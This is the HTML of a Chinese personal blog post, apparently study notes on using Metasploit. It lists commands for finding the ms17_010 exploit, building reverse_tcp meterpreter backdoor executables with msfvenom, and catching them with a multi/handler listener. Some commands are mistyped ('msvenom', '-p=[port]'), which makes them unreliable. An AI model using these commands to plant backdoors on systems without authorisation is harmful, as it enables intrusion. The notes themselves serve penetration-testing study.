@@ -1,0 +1,79 @@
+<div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover"> 
+            <img src="https://th.bing.com/th/id/R.917ca069a2af6fd72956834eb08358c5?rik=BqcoPnxAZUEIMQ&pid=ImgRaw&r=0" alt="msf使用" loading="lazy">
+            <h1>msf使用</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2023年09月04日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="msf使用"><a href="#msf使用" class="headerlink" title="msf使用"></a>msf使用</h1><p>metasploit</p>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><code>msfconsole</code></p>
+<ol>
+<li><p><code>search [ms17_010]</code> 查找漏洞</p>
+</li>
+<li><p><code>use []</code> 选择漏洞</p>
+</li>
+<li><p><code>show options</code> 查看参数</p>
+</li>
+<li><p><code>session</code> 查看会话</p>
+<p><code>session [num]</code> 选择会话</p>
+</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run vnc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p><code>msvenom -p [payload] lhost=[] lport=[] -f(format) exe -o(output) file_name.exe</code></p>
+<h2 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h2><p><code>use exploit/multi/handler</code></p>
+<h1 id="攻击主机"><a href="#攻击主机" class="headerlink" title="攻击主机"></a>攻击主机</h1><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/home/wray/.config/Typora/typora-user-images/image-20221223144819404.png" alt="image-20221223144819404" data-caption="image-20221223144819404" loading="lazy"></p>
+<h3 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h3><p>linux : <code>msvenom -p linux/x64/meterpreter/reverse_tcp lhost=[host] -p=[port] -f elf -o .elf</code></p>
+<p>win: <code>msvenom -p windows/meterpreter/reverse_tcp lhost=[host] -p=[port] -f exe -o .exe</code></p>
+<h3 id="监听木马"><a href="#监听木马" class="headerlink" title="监听木马"></a>监听木马</h3><p><code>handler -p [] lhost=[] -p []</code></p>
+<p><code>use exploit/multi/handler</code></p>
+<p><code>set</code></p>
+<p><code>run</code></p>
+
+    
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>Author：</strong>Wray Lee<br>
+        <strong>Link：</strong><a href="http://blog.wray7.top/2023/09/04/Network/Safety/msf%E4%BD%BF%E7%94%A8/" title="http:&#x2F;&#x2F;blog.wray7.top&#x2F;2023&#x2F;09&#x2F;04&#x2F;Network&#x2F;Safety&#x2F;msf%E4%BD%BF%E7%94%A8&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;blog.wray7.top&#x2F;2023&#x2F;09&#x2F;04&#x2F;Network&#x2F;Safety&#x2F;msf%E4%BD%BF%E7%94%A8&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1712678080609"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
